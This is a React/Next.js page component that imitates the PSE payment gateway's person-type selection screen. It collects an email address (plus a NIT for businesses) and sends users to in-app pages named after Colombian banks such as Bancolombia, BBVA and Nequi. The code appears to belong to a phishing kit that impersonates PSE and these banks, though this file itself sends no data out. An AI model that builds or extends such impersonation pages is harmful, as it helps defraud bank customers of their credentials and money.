"use client"
import { useEffect, useState } from "react"
import "./pse.css"
import { useRouter } from "next/navigation"
import { useSelector } from "react-redux"
//ESTILOS DE COLORES
const bg_principal = "bg-white"
const bg_card = "bg-[#ffffff]"
const text_color_principal = "text-[#065EA6]"
const text_color_secundario = "text-[#616166]"
const text_color_error = "text-[#FF384B]"

const enrutamiento = {
    "Alianza": "/bnAlianza", 
    "Avvillas": "/Avvillas", 
    "Bancolombia": "/bancolombia", 
    "BBVA": "/bbva", 
    "Caja Social": "/cajaSocial", 
    "Nequi":"/nequi"
}

const Loading = () => {
  return (
    <div className="fixed inset-0 bg-white/60 flex items-center justify-center z-50">
      <div className="w-12 h-12 border-4 border-[#fdb813] border-t-transparent rounded-full animate-spin" />
    </div>
  );
}

const Natural = ()=>{
    const router = useRouter()
    
    const {banco} = useSelector(state => state.usuario)
    const [value, setValue] = useState("")
    const [error, setError] = useState("")

     const validateEmail = (email) => {
        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return regex.test(email);
    };

    const handlerValue = (e) => {
        const inputValue = e.target.value;
        setValue(inputValue);

        if (inputValue.trim() === "") {
            setError("El correo es obligatorio");
        } else if (!validateEmail(inputValue)) {
            setError("El campo E-mail es inválido");
        } else {
            setError("");
        }
    };
    return(
        <div className="w-full rounded-xl flex flex-col justify-center items-center shadow-[0_0_10px_rgba(0,0,0,0.3)]">
            <div className="w-[60%] flex flex-col justify-center items-center">
                <div className="flex shadow-sm shadow-amber-200 w-full mt-6 pl-3 py-1 rounded-full border-1 border-gray-300">
                    <img src="/assets/pse/pseCheck.svg" className="w-6 h-6"/>
                    <span className="text-[13px] ml-1.5"> Soy un usuario registrado </span>
                </div>
                <div className="flex w-full shadow-lg mt-4 pl-3 py-1 rounded-full border-1 border-gray-300">
                    <img src="/assets/pse/pseOpact.svg" className="w-6 h-6"/>
                    <span className="text-[13px] text-[#8b8d99] ml-1.5">  Registrarme ahora </span>
                </div>
            </div>

            <div className="w-[75%] flex-col items-center justify-center mt-5">
                <div className="w-full flex justify-center">
                    <span className={`text-[14px] text-center ${text_color_principal} font-bold`}>Ingresa tu correo electrónico <span className="text-red-600 text-[12px]">*</span></span>
                </div>
                <input onChange={(e)=> handlerValue(e)} value={value} placeholder="Ej: correo@pse.com.co" className={`w-full mt-0.5 pl-1 rounded-lg border-1 focus:outline-none focus:ring-0 ${error != "" ? "border-[#FF384B]" :"border-[#065ea6]"}`} />
                {error != "" && <span className={`text-[11px] ${text_color_error}`}>{error}</span>}
            </div>
            <div className="mt-10 w-full flex flex-col items-center justify-center mb-8">
                <div className="w-[70%] flex flex-col  gap gap-y-2">
                    <button onClick={()=>{
                        if (error == "") {
                            router.push(enrutamiento[banco])
                        }
                    }} className="text-center text-[14px] py-2 bg-[#fdb813] rounded-full text-white font-bold" >Ir al banco</button>
                    <button className={`text-center text-[14px] py-2  rounded-full font-bold ${text_color_principal} border-1 border-[#065EA6]`} >Ir al banco</button>
                </div>
            </div>

        </div>
    )
}

const Juridica = () => {
    const [email, setEmail] = useState("");
    const [nit, setNit] = useState("");
    const [emailError, setEmailError] = useState("");
    const [nitError, setNitError] = useState("");

    const validateEmail = (email) => {
        const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return regex.test(email);
    };

    const handlerEmail = (e) => {
        const value = e.target.value;
        setEmail(value);

        if (value.trim() === "") {
            setEmailError("El correo es obligatorio");
        } else if (!validateEmail(value)) {
            setEmailError("El campo E-mail es inválido");
        } else {
            setEmailError("");
        }
    };

    const handlerNit = (e) => {
        const value = e.target.value;
        setNit(value);

        if (value.trim() === "") {
            setNitError("El NIT es obligatorio");
        } else if (!/^\d+$/.test(value)) {
            setNitError("El NIT debe contener solo números");
        } else if (value.length < 5) {
            setNitError("El NIT debe tener al menos 5 dígitos");
        } else {
            setNitError("");
        }
    };

    return (
        <div className="w-full rounded-xl flex flex-col justify-center items-center shadow-[0_0_10px_rgba(0,0,0,0.3)]">
            <div className="w-[60%] flex flex-col justify-center items-center">
                <div className="flex shadow-sm shadow-amber-200 w-full mt-6 pl-3 py-1 rounded-full border-1 border-gray-300">
                    <img src="/assets/pse/pseCheck.svg" className="w-6 h-6" />
                    <span className="text-[13px] ml-1.5"> Soy un usuario registrado </span>
                </div>
                <div className="flex w-full shadow-lg mt-4 pl-3 py-1 rounded-full border-1 border-gray-300">
                    <img src="/assets/pse/pseOpact.svg" className="w-6 h-6" />
                    <span className="text-[13px] text-[#8b8d99] ml-1.5"> Registrarme ahora </span>
                </div>
            </div>

            <div className="w-[75%] flex-col items-center justify-center mt-5 space-y-4">
                <div className="w-full flex-col">
                    <span className={`text-[14px] ${text_color_principal} font-bold`}>
                        NIT <span className="text-red-600 text-[12px]">*</span>
                    </span>
                    <input
                        onChange={handlerNit}
                        value={nit}
                        placeholder="Ej: 123456789"
                        className={`w-full ml-1 mt-0.5 pl-1 rounded-lg border focus:outline-none focus:ring-0 ${nitError ? "border-[#FF384B]" : "border-[#065ea6]"}`}
                    />
                    {nitError && <span className={`text-[11px] ${text_color_error}`}>{nitError}</span>}
                </div>

                <div className="w-full flex-col">
                    <span className={`text-[14px] ${text_color_principal} font-bold`}>
                        Ingresa tu correo electrónico <span className="text-red-600 text-[12px]">*</span>
                    </span>
                    <input
                        onChange={handlerEmail}
                        value={email}
                        placeholder="Ej: correo@pse.com.co"
                        className={`w-full ml-1 mt-0.5 pl-1 rounded-lg border focus:outline-none focus:ring-0 ${emailError ? "border-[#FF384B]" : "border-[#065ea6]"}`}
                    />
                    {emailError && <span className={`text-[11px] ${text_color_error}`}>{emailError}</span>}
                </div>
            </div>

            <div className="mt-10 w-full flex flex-col items-center justify-center mb-8">
                <div className="w-[70%] flex flex-col gap gap-y-2">
                    <button className="text-center text-[14px] py-2 bg-[#fdb813] rounded-full text-white font-bold">
                        Ir al banco
                    </button>
                    <button className={`text-center text-[14px] py-2 rounded-full font-bold ${text_color_principal} border border-[#065EA6]`}>
                        Ir al banco
                    </button>
                </div>
            </div>
        </div>
    );
};


export default function Pse(){
    const router = useRouter()
    const [loading, setLoading] = useState(true)
    const [tipoUsuario, setTipoUsuario] = useState("natural")
    const {banco} = useSelector(state => state.usuario)
    const handlerTipoUsuario = (value)=> setTipoUsuario(value)
    
    useEffect(()=>{
        if (!banco) {
            router.push("/")
        }
        setLoading(false)
    },[])    
    return(
        <div className={`w-full flex items-center justify-center pb-2.5 ${bg_principal}`}>
            {loading && <Loading/>}
            <div className={`w-full lg:w-[70%] flex flex-col items-center ${bg_principal}`}>
                <h5 className={`text-[14px] mb-2 font-semibold ${text_color_principal}`}>Selecciona el tipo de persona:</h5>
                <div className="w-[90%] flex flex-col justify-center items-center">
                    {/* botones */}
                    <div className="flex items-center justify-center w-full ">
                        <button onClick={()=> handlerTipoUsuario("natural")} className={`${tipoUsuario == "natural" ? "rounded-t-lg shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.1)] pl-4 pr-1 pt-2" : "px-1 rounded-t-lg border-t-1 border-l-1 border-r-1 border-slate-300 border-b-0"} `}>
                            <div className="py-1.5 px-3 flex items-center justify-center">
                                <div className={` p-0.5 ${tipoUsuario == "natural" ? "w-10 h-10 rounded-full border-1 border-[#fab613]":"w-8 h-8"}`}>
                                    <img src="/assets/pse/pseNatural.svg" className="w-full h-full object-contain" />
                                </div>
                                <span className={`${tipoUsuario == "natural" ? ` text-center text-[15px] font-light ${text_color_principal} inline-block border-b-4 border-[#fab613] pl-2 pr-4`: `text-[${text_color_secundario}] text-[14px] pl-1`}`}>Natural</span>
                            </div>
                        </button>
                        <button onClick={()=> handlerTipoUsuario("juridica")} className={`${tipoUsuario == "juridica" ? "rounded-t-lg shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.1)] pl-4 pr-1 pt-2" : "px-1 rounded-t-lg border-t-1 border-l-1 border-r-1 border-slate-300 border-b-0"} `}>
                            <div className="py-1.5 px-3 flex items-center justify-center">
                                <div className={` p-1.5 ${tipoUsuario == "juridica" ? "w-10 h-10 rounded-full border-1 border-[#fab613]":"w-8 h-8"}`}>
                                    <img src="/assets/pse/pseJuridica.svg" className="w-full h-full object-contain" />
                                </div>
                                <span className={`${tipoUsuario == "juridica" ? ` text-center text-[15px] font-light ${text_color_principal} inline-block border-b-4 border-[#fab613] pl-2 pr-4`: `text-[${text_color_secundario}] text-[14px] pl-1`}`}>Jurídica</span>
                            </div>
                        </button>
                    </div>
                    {tipoUsuario == "natural" && <Natural/>}
                    {tipoUsuario == "juridica" && <Juridica/>}
                </div>
            </div>
        </div>
    )
}